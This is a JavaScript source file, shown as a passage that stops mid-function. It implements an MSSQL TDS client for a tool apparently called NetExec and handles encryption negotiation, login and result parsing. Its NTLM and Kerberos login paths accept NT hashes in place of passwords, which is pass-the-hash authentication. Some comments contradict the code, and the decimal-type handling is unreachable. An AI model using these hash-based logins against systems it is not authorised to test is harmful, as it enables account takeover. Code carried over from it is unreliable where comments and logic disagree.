// ============================================================================
// nxc MSSQL client — TDS 7.4 over Direct Sockets, verified end-to-end against
// SQL Server 2019 (`--auth`, `--query`, `--dbs`, `--users`, …). Historical
// fixes documented in backlog.md; TL;DR:
//   * PRELOGIN: 2-option layout + ENCRYPT_REQ, TLS wrapped in PRELOGIN packets.
//   * LOGIN7: field offset table rewritten from scratch (the old map was
//     off-by-one so every login arrived as `Login failed for user ''`).
//   * Post-login TLS: only ENCRYPT_OFF (0x00) tears TLS down (impacket's rule)
//     — for ENCRYPT_ON (0x01) SQL Server 2016+ keeps enforcing TLS regardless
//     of the spec text; ripping TLS out caused every SQL_BATCH to hang.
//   * Token parser: full walker over COLMETADATA / ROW / NBCROW / ERROR /
//     INFO / ENVCHANGE / DONE, with type decoders for fixed-length, BYTELEN,
//     USHORTLEN and LONGLEN types.
//   * SPID capture / echo, PacketID slot in the packet header, 20 s timeout
//     on query() with a diagnostic snapshot when it fires.
// ============================================================================
import { concat } from '../ldap/ber.js';
import { buildType1, parseType2, computeNtlmv2Response, buildType3, randomClientChallenge, nowFiletime } from '../ntlm/ntlm.js';
import { KerberosClient, KdcSocketTransport } from '../kerberos/client.js';
import { buildGssApReq, gssInitToken, spnegoKrbInitToken } from '../kerberos/gss.js';
import { ETYPE } from '../kerberos/constants.js';
import { loadTls } from '../tls/index.js';

const TDS_PRELOGIN = 0x12;
const TDS_LOGIN7 = 0x10;
const TDS_SQL_BATCH = 0x01;
const TDS_RESPONSE = 0x04;
const TDS_STATUS_EOM = 0x01;
const TDS_SSPI = 0x11;

const u16be = (n) => { const b = new Uint8Array(2); new DataView(b.buffer).setUint16(0, n, false); return b; };
const u32le = (n) => { const b = new Uint8Array(4); new DataView(b.buffer).setUint32(0, n, true); return b; };

// MS-TDS §2.2.3.1: TDS packet header.
//   Type   (u8)  — packet type (LOGIN7, SQL_BATCH, RESPONSE, PRELOGIN, ...)
//   Status (u8)  — bit 0 = EOM, bit 1 = IGNORE, bit 3 = RESETCONNECTION, ...
//   Length (u16 BE) — total length including this 8-byte header
//   SPID   (u16 BE) — server SPID; client echoes what server sent (0 pre-login)
//   PacketID (u8) — per-message counter, starts at 0, increments per fragment
//   Window (u8)  — reserved, 0
function tdsPacket(type, status, data, spid = 0, packetId = 0) {
  const len = 8 + data.length;
  const hdr = new Uint8Array(8);
  hdr[0] = type;
  hdr[1] = status;
  const dv = new DataView(hdr.buffer);
  dv.setUint16(2, len, false);
  dv.setUint16(4, spid, false);
  hdr[6] = packetId & 0xff;
  return concat([hdr, data]);
}

function utf16le(s) {
  const b = new Uint8Array(s.length * 2);
  for (let i = 0; i < s.length; i++) { b[i * 2] = s.charCodeAt(i) & 0xff; b[i * 2 + 1] = s.charCodeAt(i) >> 8; }
  return b;
}

// PRELOGIN packet body (MS-TDS §2.2.6.5). We advertise ENCRYPT_ON (0x01) —
// SQL Server 2019+ closes the connection outright when the client offers
// ENCRYPT_NOT_SUP (0x02). ENCRYPT_ON means: TLS wraps the login exchange;
// after login the server drops back to raw TDS (per §2.2.5.1). If the server
// returns ENCRYPT_REQ (0x03) we keep the TLS session for the whole session.
// Encryption bytes:
//   0x00 ENCRYPT_OFF   — client can encrypt, off by default
//   0x01 ENCRYPT_ON    — client asks for encrypted login
//   0x02 ENCRYPT_NOT_SUP
//   0x03 ENCRYPT_REQ   — client requires encryption throughout
function buildPrelogin() {
  const version = Uint8Array.of(0x0f, 0x00, 0x07, 0xd1, 0x00, 0x00);
  // ENCRYPT_REQ (0x03) → all traffic stays TLS-encrypted, which is what most
  // modern SQL Server installations require. Simpler than ENCRYPT_ON where
  // TLS is torn down after LOGIN_ACK and post-login traffic goes plaintext.
  const encrypt = Uint8Array.of(0x03);
  const optData = concat([version, encrypt]);
  // MS-TDS §2.2.6.5: each PL_OPTION_TOKEN entry is 5 bytes (Token u8 +
  // Offset u16 BE + Length u16 BE). The offsets are relative to the start of
  // the option-token list. Two options + terminator = 2*5 + 1 = 11 bytes;
  // version data begins right after at offset 11, encryption at 11+6=17.
  const optionsLen = 2 * 5 + 1;
  const options = concat([
    Uint8Array.of(0x00), u16be(optionsLen), u16be(6),
    Uint8Array.of(0x01), u16be(optionsLen + 6), u16be(1),
    Uint8Array.of(0xff),
  ]);
  return concat([options, optData]);
}

// Parse PRELOGIN response and return the server's encryption byte, if
// present. The response body is the same PL_OPTION_TOKEN list layout used in
// the request: 5-byte {token, offset(BE), length(BE)} entries terminated by
// 0xff, followed by the option data.
function parsePreloginEncryption(resp) {
  let pos = 0;
  const dv = new DataView(resp.buffer, resp.byteOffset, resp.byteLength);
  while (pos + 1 <= resp.length) {
    const token = resp[pos];
    if (token === 0xff) return null;
    if (pos + 5 > resp.length) return null;
    const off = dv.getUint16(pos + 1, false);
    const len = dv.getUint16(pos + 3, false);
    if (token === 0x01) return len > 0 && off < resp.length ? resp[off] : null;
    pos += 5;
  }
  return null;
}

function buildLogin7(host, user, password, database) {
  const clientName = utf16le('netexec');
  const appName = utf16le('netexec-iwa');
  const serverName = utf16le(host);
  const libName = utf16le('TDS');
  const dbName = utf16le(database || 'master');
  const userName = utf16le(user);
  const pwdEnc = encryptPassword(password);
  // MS-TDS §2.2.6.4 LOGIN7 fixed header (94 bytes) followed by variable
  // string data. Offset/Length pairs live at:
  //   36 HostName, 40 UserName, 44 Password, 48 AppName, 52 ServerName,
  //   56 Extension, 60 LibraryName, 64 Language, 68 Database.
  const parts = [
    { data: clientName, off: 36 }, // HostName
    { data: userName,   off: 40 }, // UserName
    { data: pwdEnc,     off: 44 }, // Password (obfuscated)
    { data: appName,    off: 48 }, // AppName
    { data: serverName, off: 52 }, // ServerName
    { data: libName,    off: 60 }, // LibraryName
    { data: dbName,     off: 68 }, // Database
  ];
  const fixedLen = 94;
  let dataOff = fixedLen;
  for (const p of parts) { p.dataOff = dataOff; dataOff += p.data.length; }
  const body = new Uint8Array(dataOff);
  const dv = new DataView(body.buffer);
  dv.setUint32(0, dataOff, true);
  dv.setUint32(4, 0x74000004, true);    // TDSVersion 7.4
  dv.setUint32(8, 4096, true);          // PacketSize
  dv.setUint32(24, 0, true);            // OptionFlags1/2/3 + TypeFlags
  for (const p of parts) {
    dv.setUint16(p.off, p.dataOff, true);
    dv.setUint16(p.off + 2, p.data.length / 2, true);
    body.set(p.data, p.dataOff);
  }
  return body;
}

function encryptPassword(password) {
  const buf = utf16le(password);
  for (let i = 0; i < buf.length; i++) {
    buf[i] = ((buf[i] << 4) & 0xf0) | ((buf[i] >> 4) & 0x0f);
    buf[i] ^= 0xa5;
  }
  return buf;
}

function buildLogin7Sspi(host, database, sspiToken) {
  const clientName = utf16le('netexec');
  const appName = utf16le('netexec-iwa');
  const serverName = utf16le(host);
  const libName = utf16le('TDS');
  const dbName = utf16le(database || 'master');
  const fixedLen = 94;
  let off = fixedLen;
  const parts = [clientName, appName, serverName, libName, dbName, sspiToken];
  const partOffsets = [];
  for (const p of parts) { partOffsets.push(off); off += p.length; }
  const body = new Uint8Array(off);
  const dv = new DataView(body.buffer);
  dv.setUint32(0, off, true);
  dv.setUint32(4, 0x74000004, true);
  dv.setUint32(8, 4096, true);
  body[25] = 0x80; // OptionFlags2: fIntSecurity
  dv.setUint16(36, partOffsets[0], true); dv.setUint16(38, clientName.length / 2, true);
  dv.setUint16(48, partOffsets[1], true); dv.setUint16(50, appName.length / 2, true);
  dv.setUint16(52, partOffsets[2], true); dv.setUint16(54, serverName.length / 2, true);
  dv.setUint16(60, partOffsets[3], true); dv.setUint16(62, libName.length / 2, true);
  dv.setUint16(68, partOffsets[4], true); dv.setUint16(70, dbName.length / 2, true);
  dv.setUint16(78, partOffsets[5], true); dv.setUint16(80, sspiToken.length, true);
  if (sspiToken.length > 0xFFFF) { dv.setUint16(80, 0xFFFF, true); dv.setUint32(90, sspiToken.length, true); }
  let p = fixedLen;
  for (const part of parts) { body.set(part, p); p += part.length; }
  return body;
}

function extractSspiToken(resp) {
  let pos = 0;
  while (pos < resp.length) {
    const token = resp[pos++];
    if (token === 0xed) {
      const len = new DataView(resp.buffer, resp.byteOffset + pos).getUint16(0, true);
      return resp.slice(pos + 2, pos + 2 + len);
    }
    if (token === 0xfd || token === 0xfe || token === 0xff) break;
    if (token === 0xaa || token === 0xab || token === 0xad || token === 0xe3) {
      const len = new DataView(resp.buffer, resp.byteOffset + pos).getUint16(0, true);
      pos += 2 + len;
    } else break;
  }
  return null;
}

function parseNtHash(hashStr) {
  if (!hashStr) return null;
  let hex = hashStr;
  if (hex.includes(':')) hex = hex.split(':')[1];
  hex = hex.trim();
  if (hex.length !== 32) return null;
  const bytes = new Uint8Array(16);
  for (let i = 0; i < 16; i++) bytes[i] = parseInt(hex.substr(i * 2, 2), 16);
  return bytes;
}

function checkLoginResponse(resp) {
  let pos = 0;
  let loginAck = false;
  let errorMsg = '';
  while (pos < resp.length) {
    const token = resp[pos++];
    if (token === 0xad) { loginAck = true; const len = new DataView(resp.buffer, resp.byteOffset + pos).getUint16(0, true); pos += 2 + len; }
    else if (token === 0xaa) {
      // MS-TDS §2.2.7.8 ERROR token:
      //   Length u16
      //   Number u32, State u8, Class u8
      //   MsgTextLen u16  (chars)
      //   MsgText WCHAR[MsgTextLen]
      //   ServerName BVARCHAR, ProcName BVARCHAR, LineNumber u32
      const len = new DataView(resp.buffer, resp.byteOffset + pos).getUint16(0, true);
      const msgBuf = resp.slice(pos + 2, pos + 2 + len);
      pos += 2 + len;
      if (msgBuf.length >= 8) {
        const dvm = new DataView(msgBuf.buffer, msgBuf.byteOffset, msgBuf.byteLength);
        const number = dvm.getUint32(0, true);
        const msgLen = dvm.getUint16(6, true);
        let msg = '';
        for (let i = 0; i < msgLen && 8 + (i + 1) * 2 <= msgBuf.length; i++) {
          msg += String.fromCharCode(dvm.getUint16(8 + i * 2, true));
        }
        errorMsg = `[${number}] ${msg}`;
      }
    }
    else if (token === 0xe3 || token === 0xab || token === 0xfd || token === 0xfe || token === 0xff) {
      if (token === 0xfd || token === 0xfe || token === 0xff) break;
      const len = new DataView(resp.buffer, resp.byteOffset + pos).getUint16(0, true);
      pos += 2 + len;
    }
    else break;
  }
  if (!loginAck) throw new Error(errorMsg || 'TDS login failed');
}

class TdsClient {
  constructor(host, port = 1433) {
    this._host = host;
    this._port = port;
    this._buf = new Uint8Array(0);
    this._tls = null;              // TlsSession once handshake completes
    this._tlsPlain = new Uint8Array(0); // decrypted plaintext queue
    this._encryptOn = false;       // ENCRYPT_ON: login-only; false after login
    this._encryptReq = false;      // ENCRYPT_REQ: keep TLS after login
    this._spid = 0;                // last SPID observed from server, echoed on send
    this._pktRecv = 0;             // packets received since last recv() call (diag)
    this._pktBytes = 0;            // bytes received since last recv() call (diag)
  }

  async connect() {
    this._socket = new TCPSocket(this._host, this._port);
    const info = await this._socket.opened;
    this._reader = info.readable.getReader();
    this._writer = info.writable.getWriter();
  }

  async close() {
    try { this._reader?.releaseLock(); } catch {}
    try { this._writer?.releaseLock(); } catch {}
    try { await this._socket?.close(); } catch {}
  }

  // Send raw bytes to the wire — either straight to the socket, or through
  // the active TLS session if one is up (which then flushes ciphertext).
  async _sendRaw(bytes) {
    if (this._tls && (this._encryptOn || this._encryptReq)) {
      this._tls.send(bytes);
      let out;
      while ((out = this._tls.take_outgoing())) await this._writer.write(out);
    } else {
      await this._writer.write(bytes);
    }
  }

  // Read the next chunk from the wire, decrypting through TLS if active.
  async _readRaw() {
    if (!this._tls || !(this._encryptOn || this._encryptReq)) {
      const { value, done } = await this._reader.read();
      if (done) throw new Error('TDS: connection closed');
      return value;
    }
    const flushOutgoing = async () => {
      let out;
      while ((out = this._tls.take_outgoing())) await this._writer.write(out);
    };
    for (;;) {
      let p;
      while ((p = this._tls.read())) {
        const tmp = new Uint8Array(this._tlsPlain.length + p.length);
        tmp.set(this._tlsPlain); tmp.set(p, this._tlsPlain.length);
        this._tlsPlain = tmp;
      }
      await flushOutgoing();
      if (this._tlsPlain.length) { const v = this._tlsPlain; this._tlsPlain = new Uint8Array(0); return v; }
      const { value, done } = await this._reader.read();
      if (done) throw new Error('TDS: connection closed');
      for (let off = 0; off < value.length; off += 8192) {
        this._tls.recv(value.subarray(off, off + 8192));
        await flushOutgoing();
      }
    }
  }

  async send(pkt) {
    await this._sendRaw(pkt);
  }

  async recv() {
    let chunks = new Uint8Array(0);
    this._pktRecv = 0;
    this._pktBytes = 0;
    for (;;) {
      while (this._buf.length >= 8) {
        const dv = new DataView(this._buf.buffer, this._buf.byteOffset, this._buf.byteLength);
        const len = dv.getUint16(2, false);
        if (len < 8) throw new Error(`TDS: invalid packet length 0x${len.toString(16)}`);
        if (this._buf.length < len) break;
        const status = this._buf[1];
        // Capture server SPID from the first packet — MS-TDS §2.2.3.1.4 says
        // clients SHOULD echo the server-assigned SPID on subsequent request
        // packets, and some SQL-Server-compatible endpoints reject packets
        // that don't (SQL Managed Instance, third-party gateways).
        const spid = dv.getUint16(4, false);
        if (spid) this._spid = spid;
        chunks = concat([chunks, this._buf.slice(8, len)]);
        this._buf = this._buf.slice(len);
        this._pktRecv++;
        this._pktBytes += len;
        if (status & TDS_STATUS_EOM) return chunks;
      }
      const value = await this._readRaw();
      this._buf = concat([this._buf, value]);
    }
  }

  // Like recv() but throws with a diagnostic snapshot after `timeoutMs` if the
  // server never returns a full EOM'd response. Post-login queries have been
  // observed to hang; this surfaces whether the server sent partial packets
  // (ciphertext arrived, plaintext parsed) or nothing at all (silent drop).
  async recvWithTimeout(timeoutMs, ctx) {
    let timer;
    const timeout = new Promise((_, rej) => {
      timer = setTimeout(() => rej(new Error(
        `TDS: no complete response within ${timeoutMs} ms (${ctx || 'recv'}) — ` +
        `bufLen=${this._buf.length} pktRecv=${this._pktRecv} pktBytes=${this._pktBytes} ` +
        `spid=${this._spid} encReq=${this._encryptReq}`,
      )), timeoutMs);
    });
    try {
      return await Promise.race([this.recv(), timeout]);
    } finally {
      clearTimeout(timer);
    }
  }

  // Do the PRELOGIN exchange, then — if the server chose ENCRYPT_ON /
  // ENCRYPT_REQ — run a TLS handshake whose records are wrapped inside
  // PRELOGIN-type (0x12) TDS packets (MS-TDS §2.2.5.1).
  async prelogin() {
    await this._writer.write(tdsPacket(TDS_PRELOGIN, TDS_STATUS_EOM, buildPrelogin()));
    const resp = await this.recv();
    let serverEnc;
    try {
      serverEnc = parsePreloginEncryption(resp);
    } catch (e) {
      throw new Error(`TDS: PRELOGIN parse failed: ${e.message}`);
    }
    this._serverEnc = serverEnc;
    if (serverEnc === 0x00 || serverEnc === 0x01 || serverEnc === 0x03) {
      // MS-TDS §2.2.5.1 encryption negotiation results:
      //   0x00 ENCRYPT_OFF   — TLS wraps only login, post-login is plaintext
      //   0x01 ENCRYPT_ON    — same as ENCRYPT_OFF from the client's POV
      //   0x02 ENCRYPT_NOT_SUP — client should NOT do TLS
      //   0x03 ENCRYPT_REQ   — server requires TLS for every subsequent packet
      // We asked for ENCRYPT_REQ (0x03) — SQL Server 2019+ with default
      // "Force Encryption = Yes" replies with 0x03 and we stay in TLS.
      // With "Force Encryption = No" the server replies 0x00 or 0x01 and
      // we tear TLS down after LOGIN_ACK. We honour whichever the server
      // picked.
      this._encryptOn = (serverEnc === 0x01 || serverEnc === 0x00);
      this._encryptReq = (serverEnc === 0x03);
      try {
        await this._tlsHandshakeThroughTds();
      } catch (e) {
        throw new Error(`TDS: TLS handshake failed: ${e.message}`);
      }
    }
  }

  async _tlsHandshakeThroughTds() {
    const TlsSession = loadTls();
    this._tls = new TlsSession(this._host);
    // Drain the ClientHello and wrap each TLS record into a PRELOGIN TDS
    // packet; loop until TLS reports handshake complete.
    const flush = async () => {
      let out;
      while ((out = this._tls.take_outgoing())) {
        await this._writer.write(tdsPacket(TDS_PRELOGIN, TDS_STATUS_EOM, out));
      }
    };
    await flush();
    while (this._tls.is_handshaking()) {
      const chunk = await this._readTdsWrappedTls();
      this._tls.recv(chunk);
      await flush();
    }
  }

  async _readTdsWrappedTls() {
    for (;;) {
      while (this._buf.length >= 8) {
        const dv = new DataView(this._buf.buffer, this._buf.byteOffset, this._buf.byteLength);
        const len = dv.getUint16(2, false);
        if (this._buf.length < len) break;
        const body = this._buf.slice(8, len);
        this._buf = this._buf.slice(len);
        return body;
      }
      const { value, done } = await this._reader.read();
      if (done) throw new Error('TDS: connection closed during TLS handshake');
      this._buf = concat([this._buf, value]);
    }
  }

  async login(user, password, database) {
    const body = buildLogin7(this._host, user, password, database);
    await this.send(tdsPacket(TDS_LOGIN7, TDS_STATUS_EOM, body));
    const resp = await this.recv();
    if (resp.length < 4) throw new Error('TDS: empty login response');
    checkLoginResponse(resp);
    this._postLogin();
  }

  // After LOGIN_ACK, keep the TLS layer for anything but ENCRYPT_OFF (0x00).
  // The spec says ENCRYPT_ON (0x01) means "TLS wraps login only, post-login
  // clear text" but SQL Server 2016+ actually enforces TLS for the whole
  // session unless it explicitly returned ENCRYPT_OFF. impacket does the same
  // check (`if resp["Encryption"] == TDS_ENCRYPT_OFF: self.tlsSocket = None`).
  // Tearing TLS down after ENCRYPT_ON login makes every subsequent SQL_BATCH
  // arrive as plaintext and the server drops the connection silently.
  _postLogin() {
    // Only ENCRYPT_OFF (0x00) legitimately tears down TLS.
    if (this._encryptOn && this._serverEnc === 0x00) {
      if (this._tls) {
        let p;
        while ((p = this._tls.read())) {
          const tmp = new Uint8Array(this._tlsPlain.length + p.length);
          tmp.set(this._tlsPlain); tmp.set(p, this._tlsPlain.length);
          this._tlsPlain = tmp;
        }
        if (this._tlsPlain.length) {
          this._buf = concat([this._buf, this._tlsPlain]);
          this._tlsPlain = new Uint8Array(0);
        }
      }
      this._tls = null;
      this._encryptOn = false;
      return;
    }
    // Everything else: keep TLS in place for subsequent SQL_BATCH packets.
    // Promote `_encryptReq` so `_sendRaw` / `_readRaw` route through TLS.
    this._encryptReq = this._encryptReq || (this._serverEnc === 0x01 || this._serverEnc === 0x03);
  }

  async loginNtlm(user, domain, password, database, ntHash, localAuth) {
    const type1 = buildType1();
    const loginBody = buildLogin7Sspi(this._host, database, type1);
    await this.send(tdsPacket(TDS_LOGIN7, TDS_STATUS_EOM, loginBody));
    const resp1 = await this.recv();
    const type2Buf = extractSspiToken(resp1);
    if (!type2Buf) throw new Error('TDS: no SSPI challenge in server response');
    const type2 = parseType2(type2Buf);
    const effectiveDomain = (localAuth && !domain && type2.nbComputerName) ? type2.nbComputerName : domain;
    const clientChallenge = randomClientChallenge();
    const timestamp = type2.timestamp || nowFiletime();
    const { ntChallengeResponse, lmChallengeResponse } = computeNtlmv2Response(
      user, effectiveDomain, password, type2.serverChallenge, clientChallenge, timestamp, type2.targetInfo, ntHash,
    );
    const type3 = buildType3({ domain: effectiveDomain, user, ntResponse: ntChallengeResponse, lmResponse: lmChallengeResponse });
    await this.send(tdsPacket(TDS_SSPI, TDS_STATUS_EOM, type3));
    const resp2 = await this.recv();
    checkLoginResponse(resp2);
    this._postLogin();
  }

  async loginKerberos(user, domain, password, database, ntHash, kdcHost) {
    const realm = domain.toUpperCase();
    const kdc = kdcHost || this._host;
    const transport = new KdcSocketTransport(kdc, 88);
    await transport.connect();
    try {
      const krb = new KerberosClient(transport);
      const id = { username: user, realm };
      if (ntHash) {
        id.key = ntHash;
        id.etype = ETYPE.RC4_HMAC;
      } else {
        id.password = password;
      }
      const tgt = await krb.getTGT(id);
      const spn = `MSSQLSvc/${this._host}:${this._port}`;
      const tgs = await krb.getTGS(tgt, { spn });
      const apReqBytes = buildGssApReq(tgs);
      const gssToken = gssInitToken(apReqBytes);
      const spnegoToken = spnegoKrbInitToken(gssToken);
      const loginBody = buildLogin7Sspi(this._host, database, spnegoToken);
      await this.send(tdsPacket(TDS_LOGIN7, TDS_STATUS_EOM, loginBody));
      const resp = await this.recv();
      checkLoginResponse(resp);
      this._postLogin();
    } finally {
      await transport.close();
    }
  }

  // MS-TDS §2.2.6.7 SQL Batch: ALL_HEADERS + SqlText. TDS 7.4+ requires the
  // MARS Transaction Descriptor header (Type=0x0002).
  async query(sql) {
    const sqlBuf = utf16le(sql);
    // ALL_HEADERS: TotalLength u32
    //   [header]: Length u32, Type u16, TxDescriptor u64, OutstandingCount u32
    //             — 4+2+8+4 = 18 bytes
    // Total = 4 + 18 = 22 bytes.
    const header = concat([
      u32le(22),                       // TotalLength
      u32le(18),                       // Length of header entry
      Uint8Array.of(0x02, 0x00),       // Type = 2 (Transaction Descriptor)
      u32le(0), u32le(0),              // TxDescriptor u64 = 0
      u32le(1),                        // OutstandingRequestCount = 1
    ]);
    await this.send(tdsPacket(TDS_SQL_BATCH, TDS_STATUS_EOM, concat([header, sqlBuf]), this._spid, 0));
    const resp = await this.recvWithTimeout(20000, `SQL_BATCH ${JSON.stringify(sql.slice(0, 40))}`);
    return this._parseResult(resp);
  }

  // MS-TDS §2.2.7 token-stream parser for SQL Batch responses. Handles the
  // common tokens we care about: COLMETADATA (0x81) → ROW (0xD1)* → DONE
  // (0xFD/FE/FF), plus ENVCHANGE (0xE3), INFO (0xAB), and ERROR (0xAA).
  _parseResult(resp) {
    const rows = [];
    const columns = []; // {name, type, sub}
    const info = [], errors = [];
    const dv = new DataView(resp.buffer, resp.byteOffset, resp.byteLength);
    let pos = 0;

    // Read a TYPE_INFO block, return {type, sub} where `sub` captures the extra
    // metadata needed to later parse values (subLen for INTNTYPE, precision/
    // scale for DECIMAL, collation for text). Advances `pos`.
    const readTypeInfo = () => {
      const type = resp[pos++];
      const t = { type, sub: 0, precision: 0, scale: 0 };
      // Fixed-length (§2.2.5.4.1): NULL 0x1f, INT1 0x30, BIT 0x32, INT2 0x34,
      //   INT4 0x38, DATETIM4 0x3a, FLT4 0x3b, MONEY 0x3c, DATETIME 0x3d,
      //   FLT8 0x3e, MONEY4 0x7a, INT8 0x7f. No metadata bytes.
      if ([0x1f, 0x30, 0x32, 0x34, 0x38, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x7a, 0x7f].includes(type)) return t;
      // DATE (0x28) is a special variable-length type with NO scale byte —
      // value is 3 bytes preceded by a 1-byte length. TIME (0x29) /
      // DATETIME2 (0x2a) / DATETIMEOFFSET (0x2b) each carry a 1-byte scale in
      // TYPE_INFO. Handle that separately from the classic BYTELEN group.
      if (type === 0x28) return t;
      if ([0x29, 0x2a, 0x2b].includes(type)) { t.scale = resp[pos++]; return t; }
      // BYTELEN types (INTNTYPE, BITNTYPE, FLTNTYPE, MONEYNTYPE, DATETIMNTYPE,
      //   UNIQUEIDENTIFIER, GUID, CHARN, VARCHARN, BINARYN, VARBINARYN) — 1-byte size field.
      if ([0x26, 0x37, 0x6d, 0x6a, 0x68, 0x6f, 0x6e, 0x2f, 0x24, 0x2c, 0x2d, 0x2e].includes(type)) {
        t.sub = resp[pos++]; return t;
      }
      // DECIMAL/NUMERIC: size u8 + precision u8 + scale u8.
      if (type === 0x37 || type === 0x3f || type === 0x6a || type === 0x6c) {
        t.sub = resp[pos++]; t.precision = resp[pos++]; t.scale = resp[pos++]; return t;
      }
      // USHORTLEN types: BIGCHAR 0xaf, BIGVARCHAR 0xa7, BIGBINARY 0xad,
      //   BIGVARBINARY 0xa5, NCHAR 0xef, NVARCHAR 0xe7. size u16 + (for text)
      //   collation 5 bytes.
      if ([0xaf, 0xa7, 0xef, 0xe7].includes(type)) {
        t.sub = dv.getUint16(pos, true); pos += 2;
        pos += 5; // collation
        return t;
      }
      if ([0xad, 0xa5].includes(type)) {
        t.sub = dv.getUint16(pos, true); pos += 2; return t;
      }
      // LONGLEN types (TEXT 0x23, NTEXT 0x63, IMAGE 0x22, XML 0xf1, VARIANT 0x62):
      //   size u32 + optional collation + TableName BVARCHAR.
      if ([0x23, 0x63, 0x22].includes(type)) {
        t.sub = dv.getUint32(pos, true); pos += 4;
        if (type === 0x23 || type === 0x63) pos += 5; // collation
        // TableName: u16 length in wchars then wchars.
        const tableLen = dv.getUint16(pos, true); pos += 2 + tableLen * 2;
        return t;
      }
      // Fallback — unknown type; skip to end of packet by throwing.
      throw new Error(`unknown TDS type 0x${type.toString(16)}`);
    };

    const readValue = (col) => {
      const { type, sub } = col;
      // Fixed-length by type table:
      switch (type) {
        case 0x1f: return null;
        case 0x30: return resp[pos++];                                      // INT1 = TINYINT
        case 0x32: return resp[pos++] ? true : false;                       // BIT
        case 0x34: { const v = dv.getInt16(pos, true); pos += 2; return v; }  // INT2
        case 0x38: { const v = dv.getInt32(pos, true); pos += 4; return v; }  // INT4
        case 0x3b: { const v = dv.getFloat32(pos, true); pos += 4; return v; } // FLT4
        case 0x3e: { const v = dv.getFloat64(pos, true); pos += 8; return v; } // FLT8
        case 0x7f: { const v = dv.getBigInt64(pos, true); pos += 8; return v.toString(); } // INT8
        case 0x3d: {                                                        // DATETIME
          // 4-byte days since 1900-01-01 + 4-byte (1/300 s) past midnight.
          const days = dv.getInt32(pos, true); pos += 4;
          const ticks = dv.getUint32(pos, true); pos += 4;
          const ms = Math.round(ticks * 10 / 3);
          const d = new Date(Date.UTC(1900, 0, 1) + days * 86400000 + ms);
          return d.toISOString().replace('T', ' ').replace('Z', '');
        }
        case 0x3a: {                                                        // SMALLDATETIME
          const days = dv.getUint16(pos, true); pos += 2;
          const mins = dv.getUint16(pos, true); pos += 2;
          const d = new Date(Date.UTC(1900, 0, 1) + days * 86400000 + mins * 60000);
          return d.toISOString().replace('T', ' ').replace('Z', '').slice(0, 16);
        }
        case 0x3c: {                                                        // MONEY
          const hi = dv.getInt32(pos, true); const lo = dv.getUint32(pos + 4, true); pos += 8;
          return ((BigInt(hi) << 32n | BigInt(lo)) * 1n) / 10000n + '.' + ((((BigInt(hi) << 32n | BigInt(lo)) % 10000n) + 10000n) % 10000n).toString().padStart(4, '0');
        }
        case 0x7a: {                                                        // MONEY4 (SMALLMONEY)
          const v = dv.getInt32(pos, true); pos += 4;
          return (v / 10000).toFixed(4);
        }
      }
      // Variable-length: 1-byte length field before data. Covers BYTELEN
      // types plus the newer DATE / TIME / DATETIME2 / DATETIMEOFFSET
      // family (0x28-0x2b) whose values are also 1-byte-length-prefixed.
      if ([0x26, 0x37, 0x68, 0x6a, 0x6d, 0x6e, 0x6f, 0x24, 0x28, 0x29, 0x2a, 0x2b, 0x2f].includes(type)) {
        const len = resp[pos++];
        if (len === 0) return null;
        if (type === 0x26 /*INTN*/) {
          if (len === 1) { const v = resp[pos]; pos += 1; return v; }
          if (len === 2) { const v = dv.getInt16(pos, true); pos += 2; return v; }
          if (len === 4) { const v = dv.getInt32(pos, true); pos += 4; return v; }
          if (len === 8) { const v = dv.getBigInt64(pos, true); pos += 8; return v.toString(); }
        }
        if (type === 0x6d /*FLTN*/) {
          if (len === 4) { const v = dv.getFloat32(pos, true); pos += 4; return v; }
          if (len === 8) { const v = dv.getFloat64(pos, true); pos += 8; return v; }
        }
        if (type === 0x6e /*MONEYN*/) {
          // MSSQL money is stored as int * 10000. Length 4 = SMALLMONEY, 8 = MONEY.
          if (len === 4) { const v = dv.getInt32(pos, true); pos += 4; return (v / 10000).toFixed(4); }
          if (len === 8) {
            // MONEY stores high-order i32 first, then low-order u32 — quirky.
            const hi = dv.getInt32(pos, true); const lo = dv.getUint32(pos + 4, true); pos += 8;
            const n = (BigInt(hi) << 32n) | BigInt(lo);
            const abs = n < 0n ? -n : n;
            const whole = abs / 10000n, frac = abs % 10000n;
            return (n < 0n ? '-' : '') + whole.toString() + '.' + frac.toString().padStart(4, '0');
          }
        }
        if (type === 0x6f /*DATETIMN*/) {
          if (len === 4) {
            // SMALLDATETIME: 2B days + 2B minutes since 1900-01-01.
            const days = dv.getUint16(pos, true); const mins = dv.getUint16(pos + 2, true); pos += 4;
            return new Date(Date.UTC(1900, 0, 1) + days * 86400000 + mins * 60000).toISOString().replace('T', ' ').slice(0, 16);
          }
          if (len === 8) {
            const days = dv.getInt32(pos, true); const ticks = dv.getUint32(pos + 4, true); pos += 8;
            const ms = Math.round(ticks * 10 / 3);
            return new Date(Date.UTC(1900, 0, 1) + days * 86400000 + ms).toISOString().replace('T', ' ').replace('Z', '');
          }
        }
        if (type === 0x28 /*DATEN*/) {
          // 3-byte little-endian days since 0001-01-01. JS epoch (1970-01-01)
          // is day 719162 from that anchor.
          if (len === 3) {
            const days = resp[pos] | (resp[pos + 1] << 8) | (resp[pos + 2] << 16);
            pos += 3;
            const ms = (days - 719162) * 86400000;
            const d = new Date(ms);
            return Number.isNaN(d.getTime()) ? `<date:${days}>` : d.toISOString().slice(0, 10);
          }
        }
        // TIME (0x29), DATETIME2 (0x2a), DATETIMEOFFSET (0x2b) all share a
        // "time" portion sized by scale: scale 0-2 → 3 bytes, 3-4 → 4 bytes,
        // 5-7 → 5 bytes. DATETIME2 adds 3-byte date, DATETIMEOFFSET adds
        // 3-byte date + 2-byte i16 offset (minutes from UTC).
        if (type === 0x29 || type === 0x2a || type === 0x2b) {
          const scale = col.sub || col.scale || 0;
          const timeLen = scale <= 2 ? 3 : scale <= 4 ? 4 : 5;
          let ticks = 0n;
          for (let i = 0; i < timeLen; i++) ticks |= BigInt(resp[pos + i]) << BigInt(8 * i);
          pos += timeLen;
          const divisor = 10n ** BigInt(scale);
          const wholeSec = ticks / divisor;
          const fracTicks = ticks - wholeSec * divisor;
          const hh = String(Number(wholeSec / 3600n)).padStart(2, '0');
          const mm = String(Number((wholeSec / 60n) % 60n)).padStart(2, '0');
          const ss = String(Number(wholeSec % 60n)).padStart(2, '0');
          const frac = scale ? '.' + fracTicks.toString().padStart(scale, '0') : '';
          const timeStr = `${hh}:${mm}:${ss}${frac}`;
          if (type === 0x29) return timeStr;
          const days = resp[pos] | (resp[pos + 1] << 8) | (resp[pos + 2] << 16); pos += 3;
